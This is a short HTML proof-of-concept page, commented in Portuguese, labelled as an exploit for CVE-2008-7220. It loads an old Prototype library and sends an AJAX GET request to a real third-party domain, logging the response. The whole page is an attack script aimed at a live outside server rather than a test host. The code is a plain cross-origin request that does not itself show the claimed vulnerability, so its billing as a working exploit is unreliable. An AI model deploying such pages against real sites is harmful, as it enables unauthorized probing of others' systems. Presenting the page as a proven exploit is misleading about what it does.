<!DOCTYPE html>
<html>
<head>
    <title>CVE-2008-7220 PoC</title>
    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/prototype/1.5.1.1/prototype.js"></script>
</head>
<body>
    <h1>CVE-2008-7220 PoC</h1>
    <script type="text/javascript">
        // URL do servidor alvo
        var targetUrl = 'https://sales.apple.com/home';

        // Faz a solicitação AJAX para o servidor alvo
        new Ajax.Request(targetUrl, {
            method: 'get',
            onSuccess: function(response) {
                console.log('Resposta recebida:', response.responseText); // Exibe a resposta no console
            },
            onFailure: function() {
                console.error('Falha na solicitação AJAX.');
            }
        });
    </script>
</body>
</html>
